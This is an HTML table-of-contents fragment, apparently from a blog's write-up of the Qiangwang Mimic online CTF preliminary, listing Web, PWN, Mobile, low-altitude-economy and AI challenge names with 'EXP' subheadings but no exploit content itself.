href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E7%BA%BF%E4%B8%8A%E9%A2%84%E9%80%89%E8%B5%9B"><span class="nav-text">强网拟态线上预选赛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-1"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#smallcode"><span class="nav-text">smallcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#safesecret"><span class="nav-text">safesecret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezcloud"><span class="nav-text">ezcloud</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-3"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ecshop"><span class="nav-text">ecshop</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babystack"><span class="nav-text">babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-4"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mobile"><span class="nav-text">Mobile</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EZMiniAPP"><span class="nav-text">EZMiniAPP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%9A%84key"><span class="nav-text">找到加密的key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%98%E5%8E%9F%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%88customEncrypt%EF%BC%89"><span class="nav-text">还原加密算法（customEncrypt）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0%E6%98%8E%E6%96%87"><span class="nav-text">逆向解密得到明文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-5"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%8E%E7%A9%BA%E7%BB%8F%E6%B5%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="nav-text">低空经济网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Hidden-Link"><span class="nav-text">The Hidden Link</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AI"><span class="nav-text">AI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#small-injection"><span class="nav-text">small_injection</span></a></li></ol></li></ol>
 
     </div>
 </div>
